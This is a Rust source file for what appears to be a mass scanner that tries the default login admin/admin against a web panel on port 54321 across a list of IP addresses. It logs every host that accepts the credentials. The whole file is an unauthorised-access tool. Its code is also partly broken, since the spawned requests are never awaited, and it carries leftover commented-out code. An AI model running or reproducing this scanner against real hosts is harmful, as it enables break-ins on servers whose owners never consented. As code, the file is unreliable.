use tokio::time::Instant;
use std::io::{BufRead, BufReader, Write};
use std::fs::{File, OpenOptions};
use reqwest::{Client};
use serde_json::Value; 


const CONCURRENT_REQUESTS: usize = 1024;

fn generate_urls(filename: &str) -> Vec<String> {
    let mut ips = Vec::new();
    let file = File::open(&filename).expect("Failed to open file"); 
    let reader = BufReader::new(file);
    for line in reader.lines() {
        let ip = line.expect("Failed to read line").trim().to_string();
        ips.push(ip);
    }
    ips
}
/* 
async fn send_request(url: &str) -> Result<String, Error> {
    let response = reqwest::get(url).await?;
    let body = response.text().await?;
    Ok(body)
}
*/

async fn send_request(ip: &str) /*-> Result<reqwest::Response, reqwest::Error>*/ {
    let client = Client::new();
    let url = format!("http://{}:{}/login", ip, "54321");
    let data = vec![
        ("username", "admin"),
        ("password", "admin"),
    ];
    /* 
    let response = reqwest::Client::new()
    .post(&url)
    .form(&data)
    .timeout(std::time::Duration::from_secs(2))
    .send()
    .await;
    Ok(())
*/
    let response =  reqwest::Client::new()
        .post(&url)
        .form(&data)
        .timeout(std::time::Duration::from_secs(2))
        .send()
        .await
        .unwrap();


    if response.status().is_success() {
        let response_text = response.text().await.unwrap();
        // Parse the response_text as JSON using serde_json
        let response_json: Value = serde_json::from_str(&response_text).unwrap();
        if response_json["success"] == true {
            println!("成功 {}", ip);
            let outputfilename = format!("output-{}", "ips.txt");
            let mut results_file = OpenOptions::new() 
            .append(true)
            .open(outputfilename)
            .expect("Failed to open file");
            results_file.write((ip.to_owned()+"\n").as_bytes()).expect("Failed to write file");
            return
        } else {
            return
        }
    } else {
        return
    }
    return


    

}
    



#[tokio::main]
async fn main() {
    let mut filename = String::new();
    std::io::stdin().read_line(&mut filename).expect("Failed to read line");
    let filename = filename.trim().to_string();
    let ips = generate_urls(&filename);
    let start_time = Instant::now();
    let outputfilename = format!("output-{}", filename.clone());
    if  !std::path::Path::new(&outputfilename).exists() {
        File::create(&outputfilename).expect("Failed to create file");
    }
    let results_file = OpenOptions::new() 
    .append(true)
    .open(outputfilename)
    .expect("Failed to open file");

    let tasks = ips.into_iter().map(|ip| {
        tokio::spawn(async move {
            send_request(&ip)
            /* 
            match send_request(&ip).await{
                Ok(response) => {
                    if let Ok(json) = response.json::<serde_json::Value>() {
                        if json["success"] == true {
                            println!("成功 {}", ip);
                            results_file.write((ip+"\n").as_bytes()).expect("Failed to write file");
                            
                        } else {
                        }
                    } else {
                    }
                }
                Err(_) => {
                }
            }   
            */
        })
    });

    let limited_tasks: Vec<_> = tasks.take(CONCURRENT_REQUESTS).collect();

    // Collect all tasks and wait for them to complete
    tokio::join!(async {
        for task in limited_tasks {
            let _ = task.await;
        }
    });
    /* 
    tokio::join!(async {
        for task in tasks {
            let _ = task.await;
        }
    });
    */

    let elapsed_time = start_time.elapsed();
    println!("Total time taken: {:?}", elapsed_time);
}
